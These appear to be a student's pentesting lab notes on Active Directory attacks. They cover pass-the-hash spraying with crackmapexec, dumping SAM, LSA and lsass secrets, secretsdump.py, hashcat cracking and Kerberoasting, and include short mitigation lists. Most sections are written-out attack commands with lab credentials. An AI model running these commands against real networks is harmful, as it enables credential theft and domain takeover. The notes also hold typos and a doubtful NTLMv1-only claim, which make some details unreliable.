## Pass Attacks Overview

Pass the password/hash
When we crack the passwprd or can dump the SAM hashes

crackmapexec smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1
Map every device that have the ability to accept a connection from the valid account (once we got that valid account) here over SMB. It checks if we have access and local admin on that machine ('Pwn3d' message).

If we do not have the password we can do the same thing with hashes. Once we got hashes for example using psexec on msfconsole and 'hashdump' once the meterpreter executed, or after executing secretsdump after mitm6 account creation.
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth 

Can also use crackmapexec to dump the SAM
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth --sam

Or enumerate shares and what shares are available on this device
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth --shares

Or dump local security authority
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth --lsa

We can also used several built-in modules
crakmapexec smb -L

For example to dump the lassy
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth -M lsassy
lsassy does store credentials used in real time

Difference d'utiliser --local-auth et -d ?

## Pass Attacks

crackmapexec --help
crackmapexec smb --help

Lab command:
crackmapexec smb 192.168.138.0/24 -u fcastle -d MARVEL.local -p Password1

Knowing where we can access, we will later on start dumping secrets using secretsdump.py

Lab command using hash (useful if hash cannot be cracked. NTLMv1 hash only. v2 can be relayed):
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth

Dump SAM base once a connection is validated:
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth --sam
SAM base is added to working database

Enumerate the shares:
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth --shares

LSA for secret dump :
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth --lsa
Keep secrets but some passwords and so hashes might have been changed and are not valid anymore

Modules:
List modules
crackmapexec smb -L

Use module lsassy
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth -M lsassy
If any secret is stored in memory we may be able to see that

Crackmapexec database:
cmedb
help
host //all host pulled in the network
creds // all the creds we found and on what they work

## Dumping and Cracking Hashes

secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.138.137
We want SAM hashes, administrators and user account. No focus on default accounts

Sometime we can have clear password if they are stored in registries or if using wdigest

wdigest is an older protocol (Win7,8,Server2012). They patched it by disabling it.
We can force wdigest activation and wait for a login to get clear password.

Knowing we are admins on several machines thanks to crackmapexec we try dumping on all machines for additional hashes. if no access by password we can try using hash:
secretsdump.py aministrator@192.168.138.138 -hashes NTLM_HASH

LLMNR to get hash -> fcastle hash -> cracked -> sprayed the password -> found new login -> secretsdump those logins -> respray the network with local account
And all we need to crack the hash is the NT portion of the hash, not the LM

Crack NT hash: 
- Determine hash type using hash-identifier from SAM dumped secrets
- Find appropiate hashcat attack:
hashcat --help | grep NTLM
hashcat -m 1000 NT_HASH /usr/share/wordlists/rockyou.txt -O
-O : Optimized if on bare-metal

## Pass Attack Mitigation

- Avoid re-using local admin password
- Disable Guest and Administrators accounts
- Limit administrators (least privilege)
- Utilise strong password without common words (can use sentence)
Set check-in and check-out on sensitive accounts when needed. Automatically rotate password on check in/out

## Kerberoasting Overview

This attack takes advantages of service attack
We provide a TGT request to the DC to obtain access to an Application Server (provide NTLM hash).
Once server answered we request a TGS for server to the DC.
At step 4 we receive a TGS encrypted with server's account hash from DC.
Once we have a valid TGT from a compromised/possessed domain account, then we can request the TGS that is going to have the hash of service account.
We can use GetUserSPNs.py to use our username and password, point to the domain controller that is our KDC and issue a request, gather the hash and crack it.

## Kerberoasting Walkthrough

SPN = Service Principal Name
Using a compromise account on the DC we can initiate a request using this command
sudo GetUserSPNS.py MARVEL.local/fcastle:Password -dc-p 192.168.132.136 -request

From result grab krb hash and put it in krb.txt file
hashcat -m 13100 krb.txt /usr/share/wordlist/rockyou.txt

## Kerberoastin Mitigation

- Do not run the service account as admin
- Service account should have strong password
- Do not mark password account in account description